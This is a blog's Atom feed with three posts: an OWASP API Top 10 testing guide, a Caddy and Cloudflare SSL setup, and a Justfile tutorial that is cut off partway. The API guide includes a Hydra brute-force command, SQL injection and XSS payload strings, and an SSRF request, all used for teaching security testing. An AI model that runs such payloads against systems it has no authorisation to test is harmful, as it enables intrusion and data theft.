<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ian&#39;s Archives</title>
  
  
  <link href="http://iaaaannn0.com/atom.xml" rel="self"/>
  
  <link href="http://iaaaannn0.com/"/>
  <updated>2025-02-19T12:37:28.034Z</updated>
  <id>http://iaaaannn0.com/</id>
  
  <author>
    <name>Ian</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Top 10 API Security Vulnerabilities and How to Test Them</title>
    <link href="http://iaaaannn0.com/2025/02/19/API-Security-Testing/"/>
    <id>http://iaaaannn0.com/2025/02/19/API-Security-Testing/</id>
    <published>2025-02-19T12:19:22.000Z</published>
    <updated>2025-02-19T12:37:28.034Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://pbs.twimg.com/media/GkAtdb4aAAAFA-i?format=png&name=large"></p><p><a href="https://x.com/harshleenchawl2/status/1892075136582381939">source</a></p><h3 id="1-Broken-Object-Level-Authorization-BOLA"><a href="#1-Broken-Object-Level-Authorization-BOLA" class="headerlink" title="1. Broken Object Level Authorization (BOLA)"></a>1. Broken Object Level Authorization (BOLA)</h3><p><strong>Description:</strong> API users should only be able to access resources that belong to them. When BOLA occurs, users may be able to access resources that don’t belong to them.</p><p><strong>Example:</strong><br>If an API lets users view their personal information, an attacker might modify the URL from <code>/user/123</code> to <code>/user/124</code> to access another user’s information.</p><p><strong>How to Test:</strong><br>Modify the object identifier in the request URL and check if you can access other users’ data. If unauthorized access is possible, it indicates a BOLA vulnerability.</p><h3 id="2-Broken-Authentication"><a href="#2-Broken-Authentication" class="headerlink" title="2. Broken Authentication"></a>2. Broken Authentication</h3><p><strong>Description:</strong> This occurs when an API’s authentication mechanisms are weak or poorly implemented, allowing attackers to bypass them.</p><p><strong>Example:</strong><br>A simple username and password-based login system without multi-factor authentication may allow an attacker to guess passwords and gain unauthorized access.</p><p><strong>How to Test:</strong><br>Attempt to log in with weak passwords or use brute force attacks. Check whether the API enforces strong password policies and multi-factor authentication.</p><h3 id="3-Broken-Object-Property-Level-Authorization"><a href="#3-Broken-Object-Property-Level-Authorization" class="headerlink" title="3. Broken Object Property Level Authorization"></a>3. Broken Object Property Level Authorization</h3><p><strong>Description:</strong> This vulnerability occurs when an API allows users to access properties of an object that they shouldn’t be able to.</p><p><strong>Example:</strong><br>An API that lets users view their profiles could have a flaw where users can modify parameters in the request (like <code>?include_salary=true</code>) to access others’ sensitive information, such as salary.</p><p><strong>How to Test:</strong><br>Test by modifying request parameters to access unauthorized object properties. Ensure sensitive data like salary or private emails cannot be accessed without proper authorization.</p><h3 id="4-Unrestricted-Resource-Consumption"><a href="#4-Unrestricted-Resource-Consumption" class="headerlink" title="4. Unrestricted Resource Consumption"></a>4. Unrestricted Resource Consumption</h3><p><strong>Description:</strong> APIs may lack resource consumption limits, allowing attackers to overwhelm the system, causing denial of service or service degradation.</p><p><strong>Example:</strong><br>Uploading large files, like a 100MB video, could consume server resources, leading to downtime or slower responses for legitimate users.</p><p><strong>How to Test:</strong><br>Upload large files or send numerous requests in a short time and check whether the API enforces proper limits on file size or request frequency.</p><h3 id="5-Broken-Function-Level-Authorization"><a href="#5-Broken-Function-Level-Authorization" class="headerlink" title="5. Broken Function Level Authorization"></a>5. Broken Function Level Authorization</h3><p><strong>Description:</strong> This flaw occurs when an API allows users to access functions they are not authorized to use.</p><p><strong>Example:</strong><br>An API may allow regular users to call administrative functions like deleting or modifying data that only admins should have access to.</p><p><strong>How to Test:</strong><br>Attempt to access restricted functions by modifying the request or using a lower privilege account. If the system does not enforce proper function-level authorization, it is vulnerable.</p><h3 id="6-Unrestricted-Access-to-Sensitive-Business-Flows"><a href="#6-Unrestricted-Access-to-Sensitive-Business-Flows" class="headerlink" title="6. Unrestricted Access to Sensitive Business Flows"></a>6. Unrestricted Access to Sensitive Business Flows</h3><p><strong>Description:</strong> APIs that expose sensitive business processes, like payment or financial transactions, should have strict access controls. If these processes are improperly protected, unauthorized users may execute actions they shouldn’t.</p><p><strong>Example:</strong><br>An attacker could call a payment API directly to make unauthorized payments if proper authentication and access controls are missing.</p><p><strong>How to Test:</strong><br>Test by attempting to execute sensitive business operations (like payments or transfers) without proper authorization. Verify that only authorized users can access these flows.</p><h3 id="7-Server-Side-Request-Forgery-SSRF"><a href="#7-Server-Side-Request-Forgery-SSRF" class="headerlink" title="7. Server Side Request Forgery (SSRF)"></a>7. Server Side Request Forgery (SSRF)</h3><p><strong>Description:</strong> SSRF vulnerabilities allow attackers to send requests from the server to internal or external resources that they shouldn’t be able to access.</p><p><strong>Example:</strong><br>An API that accepts a URL parameter might allow an attacker to input an internal service URL (e.g., <code>http://internal-api.local</code>), potentially exposing sensitive internal systems.</p><p><strong>How to Test:</strong><br>Use tools like Burp Collaborator to inject internal or malicious URLs into the API requests and check if the server accesses them. If it does, SSRF is a vulnerability.</p><h3 id="8-Security-Misconfiguration"><a href="#8-Security-Misconfiguration" class="headerlink" title="8. Security Misconfiguration"></a>8. Security Misconfiguration</h3><p><strong>Description:</strong> Security misconfigurations occur when an API is improperly set up, leading to vulnerabilities such as exposing sensitive information in error messages or unnecessarily open ports.</p><p><strong>Example:</strong><br>An API might expose detailed error messages that include stack traces, which attackers can use to identify vulnerabilities in the system.</p><p><strong>How to Test:</strong><br>Scan the API for unnecessary open ports, exposed debugging information, or detailed error messages that can reveal sensitive information.</p><h3 id="9-Improper-Inventory-Management"><a href="#9-Improper-Inventory-Management" class="headerlink" title="9. Improper Inventory Management"></a>9. Improper Inventory Management</h3><p><strong>Description:</strong> APIs might expose old or unused endpoints that can be exploited by attackers if not properly managed.</p><p><strong>Example:</strong><br>An outdated API endpoint might still be active, even though the service no longer uses it. Attackers could exploit it to gain unauthorized access or retrieve sensitive data.</p><p><strong>How to Test:</strong><br>Check for unused, outdated, or hidden API endpoints that may still be accessible. Verify if the API properly removes or disables old endpoints.</p><h3 id="10-Unsafe-Consumption-of-APIs"><a href="#10-Unsafe-Consumption-of-APIs" class="headerlink" title="10. Unsafe Consumption of APIs"></a>10. Unsafe Consumption of APIs</h3><p><strong>Description:</strong> APIs that fail to properly validate user input are vulnerable to attacks like SQL injection or cross-site scripting (XSS).</p><p><strong>Example:</strong><br>An API that allows users to submit text input might fail to sanitize the input, allowing an attacker to inject malicious code, such as <code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>.</p><p><strong>How to Test:</strong><br>Inject malicious scripts or SQL commands into input fields and observe whether the API performs proper input validation. If malicious code is executed, the API is vulnerable.</p><blockquote><p>Let’s assume we are testing an e-commerce API that handles user profiles, payment transactions, and inventory management. Our goal is to assess the security posture of the API using various tools and techniques.</p></blockquote><h3 id="1-Broken-Object-Level-Authorization-BOLA-1"><a href="#1-Broken-Object-Level-Authorization-BOLA-1" class="headerlink" title="1. Broken Object Level Authorization (BOLA)"></a>1. <strong>Broken Object Level Authorization (BOLA)</strong></h3><p><strong>Vulnerability:</strong> Users can access resources they shouldn’t.</p><p><strong>Simulated Scenario:</strong> We’re testing whether a user can access the profile data of other users by modifying the <code>user_id</code> in the API endpoint.</p><p><strong>API Endpoint:</strong><br><code>GET /user/&#123;user_id&#125;</code></p><p><strong>Testing Process:</strong></p><ol><li><strong>Tool:</strong> Postman or Burp Suite</li><li>Command:<ul><li>First, log in as <code>user123</code> and retrieve the profile:<br><code>GET /user/123</code></li><li>Now, try changing the <code>user_id</code> parameter to <code>124</code> to see if you can access another user’s profile:<br><code>GET /user/124</code></li></ul></li><li><strong>Observation:</strong> If you are able to access user <code>124</code>‘s data without proper authorization, the API has a BOLA vulnerability.</li></ol><p><strong>Tooling:</strong></p><ul><li><strong>Burp Suite:</strong> Use Burp Suite’s “Repeater” to modify the <code>user_id</code> and test different user IDs.</li><li><strong>Postman:</strong> Manually change the <code>user_id</code> parameter in the request.</li></ul><h3 id="2-Broken-Authentication-1"><a href="#2-Broken-Authentication-1" class="headerlink" title="2. Broken Authentication"></a>2. <strong>Broken Authentication</strong></h3><p><strong>Vulnerability:</strong> Weak authentication mechanisms allow attackers to bypass security.</p><p><strong>Simulated Scenario:</strong> We will check if the API allows weak password authentication or if brute force can bypass login.</p><p><strong>API Endpoint:</strong><br><code>POST /login</code></p><p><strong>Testing Process:</strong></p><ol><li><strong>Tool:</strong> Hydra (for brute force), Burp Suite</li><li>Command:<ul><li>Use Burp Suite to intercept the login request and try to submit incorrect login credentials.</li><li>Alternatively, use Hydra for brute-force testing:<br><code>hydra -l admin -P /path/to/password-list http://localhost:8080 login</code></li></ul></li><li><strong>Observation:</strong> If you can successfully authenticate with weak credentials, the API is vulnerable to brute-force or weak password attacks.</li></ol><p><strong>Tooling:</strong></p><ul><li><strong>Hydra:</strong> A fast password-cracking tool.</li><li><strong>Burp Suite:</strong> Use the Intruder tab for brute-force login attempts.</li></ul><h3 id="3-Broken-Object-Property-Level-Authorization-1"><a href="#3-Broken-Object-Property-Level-Authorization-1" class="headerlink" title="3. Broken Object Property Level Authorization"></a>3. <strong>Broken Object Property Level Authorization</strong></h3><p><strong>Vulnerability:</strong> Unauthorized users can access sensitive properties of objects.</p><p><strong>Simulated Scenario:</strong> A user tries to access the <code>salary</code> field of a profile object that they shouldn’t be able to.</p><p><strong>API Endpoint:</strong><br><code>GET /profile/&#123;user_id&#125;</code></p><p><strong>Testing Process:</strong></p><ol><li><strong>Tool:</strong> Postman or Burp Suite</li><li>Command:<ul><li>Retrieve the profile details for user <code>123</code>:<br><code>GET /profile/123</code></li><li>Attempt to access a hidden or restricted property like <code>salary</code>:<br><code>GET /profile/123?include_salary=true</code></li></ul></li><li><strong>Observation:</strong> If the response includes sensitive information like salary, the API lacks proper property-level authorization checks.</li></ol><p><strong>Tooling:</strong></p><ul><li><strong>Postman:</strong> Modify the parameters and check if sensitive data can be exposed.</li><li><strong>Burp Suite:</strong> Intercept requests to modify query parameters.</li></ul><h3 id="4-Unrestricted-Resource-Consumption-1"><a href="#4-Unrestricted-Resource-Consumption-1" class="headerlink" title="4. Unrestricted Resource Consumption"></a>4. <strong>Unrestricted Resource Consumption</strong></h3><p><strong>Vulnerability:</strong> No resource consumption limits in place, causing potential denial of service (DoS).</p><p><strong>Simulated Scenario:</strong> We attempt to upload large files to see if the API imposes any size restrictions.</p><p><strong>API Endpoint:</strong><br><code>POST /upload</code></p><p><strong>Testing Process:</strong></p><ol><li><strong>Tool:</strong> Postman</li><li>Command:<ul><li>Try uploading large files using Postman:<br><code>POST /upload</code><br>Attach a 100MB or larger file to the request.</li></ul></li><li><strong>Observation:</strong> If the API does not impose a file size limit, it is vulnerable to resource exhaustion (e.g., denial of service).</li></ol><p><strong>Tooling:</strong></p><ul><li><strong>Postman:</strong> Use Postman to upload large files and check if the API rejects files that exceed certain sizes.</li></ul><h3 id="5-Broken-Function-Level-Authorization-1"><a href="#5-Broken-Function-Level-Authorization-1" class="headerlink" title="5. Broken Function Level Authorization"></a>5. <strong>Broken Function Level Authorization</strong></h3><p><strong>Vulnerability:</strong> Users can access functions they are not authorized to.</p><p><strong>Simulated Scenario:</strong> We test whether a regular user can access admin functions like deleting an order.</p><p><strong>API Endpoint:</strong><br><code>DELETE /order/&#123;order_id&#125;</code></p><p><strong>Testing Process:</strong></p><ol><li><strong>Tool:</strong> Postman</li><li>Command:<ul><li>First, test with a regular user (non-admin) to see if they can delete an order:<br><code>DELETE /order/999</code></li></ul></li><li><strong>Observation:</strong> If the regular user is able to delete an order without proper authorization, there is a broken function-level authorization.</li></ol><p><strong>Tooling:</strong></p><ul><li><strong>Postman:</strong> Send DELETE requests as a regular user to access admin-only functions.</li></ul><h3 id="6-Unrestricted-Access-to-Sensitive-Business-Flows-1"><a href="#6-Unrestricted-Access-to-Sensitive-Business-Flows-1" class="headerlink" title="6. Unrestricted Access to Sensitive Business Flows"></a>6. <strong>Unrestricted Access to Sensitive Business Flows</strong></h3><p><strong>Vulnerability:</strong> Unauthorized users can trigger sensitive business operations, like payments.</p><p><strong>Simulated Scenario:</strong> We test whether a user can make unauthorized payments through the API.</p><p><strong>API Endpoint:</strong><br><code>POST /payment</code></p><p><strong>Testing Process:</strong></p><ol><li><strong>Tool:</strong> Postman</li><li>Command:<ul><li>Make a payment request without proper authorization (as a non-logged-in user):<br><code>POST /payment</code><br>Include payment details in the body (amount, recipient).</li></ul></li><li><strong>Observation:</strong> If the API allows a non-authenticated or unauthorized user to make a payment, it has a vulnerability.</li></ol><p><strong>Tooling:</strong></p><ul><li><strong>Postman:</strong> Manually test for unauthorized access to sensitive business operations.</li></ul><h3 id="7-Server-Side-Request-Forgery-SSRF-1"><a href="#7-Server-Side-Request-Forgery-SSRF-1" class="headerlink" title="7. Server Side Request Forgery (SSRF)"></a>7. <strong>Server Side Request Forgery (SSRF)</strong></h3><p><strong>Vulnerability:</strong> An attacker can cause the server to make unauthorized requests.</p><p><strong>Simulated Scenario:</strong> We will test if the API allows SSRF by submitting a URL that points to an internal resource.</p><p><strong>API Endpoint:</strong><br><code>GET /fetch</code></p><p><strong>Testing Process:</strong></p><ol><li><strong>Tool:</strong> Burp Suite or Postman</li><li>Command:<ul><li>Submit a request with an internal URL:<br><code>GET /fetch?url=http://localhost:8080/internal</code></li></ul></li><li><strong>Observation:</strong> If the API fetches internal resources (e.g., database servers, metadata services), it is vulnerable to SSRF.</li></ol><p><strong>Tooling:</strong></p><ul><li><strong>Burp Suite:</strong> Modify the request to include malicious internal URLs.</li><li><strong>Postman:</strong> Test for SSRF by submitting requests that point to internal services.</li></ul><h3 id="8-Security-Misconfiguration-1"><a href="#8-Security-Misconfiguration-1" class="headerlink" title="8. Security Misconfiguration"></a>8. <strong>Security Misconfiguration</strong></h3><p><strong>Vulnerability:</strong> Poor API configuration exposes sensitive data or vulnerabilities.</p><p><strong>Simulated Scenario:</strong> We check if the API exposes unnecessary information, such as debug data.</p><p><strong>API Endpoint:</strong><br><code>GET /error</code></p><p><strong>Testing Process:</strong></p><ol><li><strong>Tool:</strong> Burp Suite or any network scanner</li><li>Command:<ul><li>Trigger an error on the server:<br><code>GET /error</code><br>Check the response for error details or stack traces.</li></ul></li><li><strong>Observation:</strong> If sensitive information (like stack traces or internal system details) is exposed, the API is misconfigured.</li></ol><p><strong>Tooling:</strong></p><ul><li><strong>Burp Suite:</strong> Intercept the error messages to analyze the responses.</li><li><strong>Network Scanner:</strong> Check for exposed open ports or services.</li></ul><h3 id="9-Improper-Inventory-Management-1"><a href="#9-Improper-Inventory-Management-1" class="headerlink" title="9. Improper Inventory Management"></a>9. <strong>Improper Inventory Management</strong></h3><p><strong>Vulnerability:</strong> The API exposes old or unused endpoints that can be exploited.</p><p><strong>Simulated Scenario:</strong> We attempt to access deprecated or hidden API endpoints.</p><p><strong>API Endpoint:</strong><br><code>GET /old-api-endpoint</code></p><p><strong>Testing Process:</strong></p><ol><li><strong>Tool:</strong> Burp Suite, Postman</li><li>Command:<ul><li>Try accessing deprecated API endpoints:<br><code>GET /old-api-endpoint</code></li></ul></li><li><strong>Observation:</strong> If the API exposes deprecated endpoints, it could lead to security issues. Ensure old or unused endpoints are disabled.</li></ol><p><strong>Tooling:</strong></p><ul><li><strong>Burp Suite:</strong> Use the “Spider” tool to discover hidden or unused endpoints.</li><li><strong>Postman:</strong> Manually test for deprecated API versions.</li></ul><h3 id="10-Unsafe-Consumption-of-APIs-1"><a href="#10-Unsafe-Consumption-of-APIs-1" class="headerlink" title="10. Unsafe Consumption of APIs"></a>10. <strong>Unsafe Consumption of APIs</strong></h3><p><strong>Vulnerability:</strong> Failure to properly sanitize user inputs, leading to SQL injection or XSS attacks.</p><p><strong>Simulated Scenario:</strong> We test whether the API is vulnerable to XSS or SQL injection attacks.</p><p><strong>API Endpoint:</strong><br><code>GET /search</code></p><p><strong>Testing Process:</strong></p><ol><li><strong>Tool:</strong> Burp Suite, SQLMap, or Postman</li><li>Command:<ul><li>Test for SQL injection:<br><code>GET /search?query=&#39; OR 1=1 --</code></li><li>Test for XSS:<br><code>GET /search?query=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></li></ul></li><li><strong>Observation:</strong> If the API executes malicious code or query manipulation, it is vulnerable to SQL injection or XSS.</li></ol><p><strong>Tooling:</strong></p><ul><li><strong>SQLMap:</strong> Automate SQL injection testing.</li><li><strong>Postman:</strong> Inject XSS payloads.</li><li><strong>Burp Suite:</strong> Intercept and modify inputs to test for injection flaws.</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://pbs.twimg.com/media/GkAtdb4aAAAFA-i?format=png&amp;name=large&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://x.com/harshleenchawl2/status/189207</summary>
      
    
    
    
    
    <category term="vuls" scheme="http://iaaaannn0.com/tags/vuls/"/>
    
  </entry>
  
  <entry>
    <title>Configuring Caddy to Handle Multiple Sites and Automatic SSL with Cloudflare</title>
    <link href="http://iaaaannn0.com/2025/02/08/Configuring-Caddy-to-Handle-Multiple-Sites-and-Automatic-SSL-with-Cloudflare/"/>
    <id>http://iaaaannn0.com/2025/02/08/Configuring-Caddy-to-Handle-Multiple-Sites-and-Automatic-SSL-with-Cloudflare/</id>
    <published>2025-02-07T20:36:23.000Z</published>
    <updated>2025-02-07T20:43:18.699Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Automatically-Obtain-SSL-Certificates-Using-Cloudflare-DNS-Plugin"><a href="#Automatically-Obtain-SSL-Certificates-Using-Cloudflare-DNS-Plugin" class="headerlink" title="Automatically Obtain SSL Certificates Using Cloudflare DNS Plugin"></a>Automatically Obtain SSL Certificates Using Cloudflare DNS Plugin</h2><h3 id="Installing-the-Cloudflare-Plugin"><a href="#Installing-the-Cloudflare-Plugin" class="headerlink" title="Installing the Cloudflare Plugin"></a>Installing the Cloudflare Plugin</h3><p>Caddy supports various DNS validation methods via its plugin system. To use DNS-01 validation with Cloudflare, you need to install the <strong>Cloudflare DNS plugin</strong> using the <code>caddy add-package</code> command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo caddy add-package github.com/caddy-dns/cloudflare</span><br></pre></td></tr></table></figure><p>This command will download and install the Cloudflare DNS plugin, after which it will update the Caddy binary to include the plugin. Once the installation is complete, you’ll be able to use Cloudflare’s API for DNS-01 validation, which avoids challenges caused by Cloudflare’s proxy mode (orange cloud).</p><h3 id="Configuring-Caddyfile-for-DNS-01-Validation"><a href="#Configuring-Caddyfile-for-DNS-01-Validation" class="headerlink" title="Configuring Caddyfile for DNS-01 Validation"></a>Configuring Caddyfile for DNS-01 Validation</h3><p>In your <code>Caddyfile</code>, configure each site to use Cloudflare for SSL certificate issuance. You can either provide your Cloudflare API Token directly in the <code>Caddyfile</code> or through an environment variable like <code>CLOUDFLARE_API_TOKEN</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export CLOUDFLARE_API_TOKEN=your_api_token</span><br></pre></td></tr></table></figure><p>Then, configure your <code>Caddyfile</code> as follows:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">example.com &#123;</span><br><span class="line">    root * /var/www/example</span><br><span class="line">    file_server</span><br><span class="line">    tls cloudflare</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">blog.example.com &#123;</span><br><span class="line">    reverse_proxy localhost:3000</span><br><span class="line">    tls cloudflare</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>With this configuration, Caddy will automatically use Cloudflare’s DNS-01 challenge to issue SSL certificates, even if Cloudflare proxy is enabled.</p><h2 id="Configuring-Multiple-Sites-and-Reverse-Proxy"><a href="#Configuring-Multiple-Sites-and-Reverse-Proxy" class="headerlink" title="Configuring Multiple Sites and Reverse Proxy"></a>Configuring Multiple Sites and Reverse Proxy</h2><h3 id="1-Static-Website-Configuration"><a href="#1-Static-Website-Configuration" class="headerlink" title="1. Static Website Configuration"></a>1. Static Website Configuration</h3><p>Suppose you have a static website, <code>example.com</code>, with its files stored under <code>/var/www/example</code>. The configuration in the <code>Caddyfile</code> would look like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">example.com &#123;</span><br><span class="line">    root * /var/www/example</span><br><span class="line">    file_server</span><br><span class="line">    tls cloudflare</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This configuration means that when someone accesses <code>example.com</code>, Caddy will serve files from <code>/var/www/example</code> and automatically obtain an SSL certificate for the domain.</p><h3 id="2-Reverse-Proxy-Configuration"><a href="#2-Reverse-Proxy-Configuration" class="headerlink" title="2. Reverse Proxy Configuration"></a>2. Reverse Proxy Configuration</h3><p>Suppose you have an application running locally (e.g., a blog) on port 3000, and you want Caddy to forward traffic to that application. In your <code>Caddyfile</code>, you would use the <code>reverse_proxy</code> directive like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">blog.example.com &#123;</span><br><span class="line">    reverse_proxy localhost:3000</span><br><span class="line">    tls cloudflare</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This configuration will forward all traffic to <code>blog.example.com</code> to your local service running on port 3000.</p><h2 id="Blocking-Direct-IP-Access"><a href="#Blocking-Direct-IP-Access" class="headerlink" title="Blocking Direct IP Access"></a>Blocking Direct IP Access</h2><p>If you want to prevent users from accessing your website through the server’s IP address and only allow access via the domain name, you can add a rule in your <code>Caddyfile</code> to check the <code>Host</code> header in the request.</p><p>You can use the <code>respond</code> directive to reject unauthorized access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Block access via IP</span><br><span class="line">:80 &#123;</span><br><span class="line">    respond &quot;Access Denied&quot; 403</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">example.com &#123;</span><br><span class="line">    root * /var/www/example</span><br><span class="line">    file_server</span><br><span class="line">    tls cloudflare</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">blog.example.com &#123;</span><br><span class="line">    reverse_proxy localhost:3000</span><br><span class="line">    tls cloudflare</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this configuration:</p><ul><li><code>:80</code> handles all HTTP requests to the IP address and returns a <code>403 Forbidden</code> response, blocking access.</li><li><code>example.com</code> and <code>blog.example.com</code> are properly configured and will allow requests to these domains.</li></ul><p>This ensures that users can only access the website via the correct domain and prevents direct IP access.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Automatically-Obtain-SSL-Certificates-Using-Cloudflare-DNS-Plugin&quot;&gt;&lt;a href=&quot;#Automatically-Obtain-SSL-Certificates-Using-Cloudflare-</summary>
      
    
    
    
    
    <category term="cloudflare" scheme="http://iaaaannn0.com/tags/cloudflare/"/>
    
    <category term="candy" scheme="http://iaaaannn0.com/tags/candy/"/>
    
  </entry>
  
  <entry>
    <title>Efficient Python Project Management with Just</title>
    <link href="http://iaaaannn0.com/2025/02/07/Efficient-Python-Project-Management-with-Just/"/>
    <id>http://iaaaannn0.com/2025/02/07/Efficient-Python-Project-Management-with-Just/</id>
    <published>2025-02-07T17:51:09.000Z</published>
    <updated>2025-02-07T17:53:07.911Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="What-is-just"><a href="#What-is-just" class="headerlink" title="What is just?"></a>What is <code>just</code>?</h3><p><code>just</code> is a task runner that allows you to automate repetitive tasks. You define tasks in a <code>Justfile</code>, and instead of remembering long commands, you can simply run <code>just &lt;task&gt;</code> to execute them. This makes project management much simpler.</p></blockquote><h3 id="Creating-a-Justfile"><a href="#Creating-a-Justfile" class="headerlink" title="Creating a Justfile"></a>Creating a Justfile</h3><p>To use <code>just</code>, create a <code>Justfile</code> in the root directory of your project. This file is where you define your tasks.</p><h4 id="Basic-Task-Definition"><a href="#Basic-Task-Definition" class="headerlink" title="Basic Task Definition"></a>Basic Task Definition</h4><p>A <code>Justfile</code> contains one or more tasks. Each task has a name followed by the commands you want to run.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Justfile</span><br><span class="line"></span><br><span class="line"># Define a task called hello</span><br><span class="line">hello:</span><br><span class="line">    echo &quot;Hello, World!&quot;</span><br></pre></td></tr></table></figure><p><strong>Explanation</strong>:</p><ul><li><code>hello:</code> is the task name.</li><li><code>echo &quot;Hello, World!&quot;</code> is the command that will run when you invoke this task.</li></ul><h4 id="Running-the-Task"><a href="#Running-the-Task" class="headerlink" title="Running the Task"></a>Running the Task</h4><p>Once you’ve created the <code>Justfile</code>, you can run the task in your terminal by typing:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">just hello</span><br></pre></td></tr></table></figure><p>You should see the following output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, World!</span><br></pre></td></tr></table></figure><h3 id="Using-Variables-in-Tasks"><a href="#Using-Variables-in-Tasks" class="headerlink" title="Using Variables in Tasks"></a>Using Variables in Tasks</h3><p>You can define variables in the <code>Justfile</code> and use them in your tasks. Variables are defined simply by assignment.</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example:"></a>Example:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Justfile</span><br><span class="line"></span><br><span class="line"># Define a variable</span><br><span class="line">name := &quot;Alice&quot;</span><br><span class="line"></span><br><span class="line"># Define a task</span><br><span class="line">greet:</span><br><span class="line">    echo &quot;Hello, &#123;&#123;name&#125;&#125;!&quot;</span><br></pre></td></tr></table></figure><p><code>&#123;&#123;name&#125;&#125;</code> will be replaced with the value of the <code>name</code> variable. When you run the task:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">just greet</span><br></pre></td></tr></table></figure><p>The output will be:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, Alice!</span><br></pre></td></tr></table></figure><h4 id="Using-Command-Line-Arguments"><a href="#Using-Command-Line-Arguments" class="headerlink" title="Using Command-Line Arguments"></a>Using Command-Line Arguments</h4><p>You can also pass arguments from the command line to your tasks. This is useful if you want your tasks to be dynamic and change based on input.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Justfile</span><br><span class="line"></span><br><span class="line"># Task with command-line argument</span><br><span class="line">greet_name name:</span><br><span class="line">    echo &quot;Hello, &#123;&#123;name&#125;&#125;!&quot;</span><br></pre></td></tr></table></figure><p>Now you can run the task and provide a name as an argument:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">just greet_name Bob</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, Bob!</span><br></pre></td></tr></table></figure><h3 id="Task-Dependencies"><a href="#Task-Dependencies" class="headerlink" title="Task Dependencies"></a>Task Dependencies</h3><p>You can make tasks depend on other tasks. This allows you to chain tasks together, ensuring that one task runs before another.</p><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example:"></a>Example:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Justfile</span><br><span class="line"></span><br><span class="line"># Define a setup task</span><br><span class="line">setup:</span><br><span class="line">    echo &quot;Setting up the environment&quot;</span><br><span class="line"></span><br><span class="line"># Define a build task, which depends on setup</span><br><span class="line">build: setup</span><br><span class="line">    echo &quot;Building the project&quot;</span><br></pre></td></tr></table></figure><p>In this case, running <code>just build</code> will first execute the <code>setup</code> task, and then it will proceed with the <code>build</code> task:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">just build</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Setting up the environment</span><br><span class="line">Building the 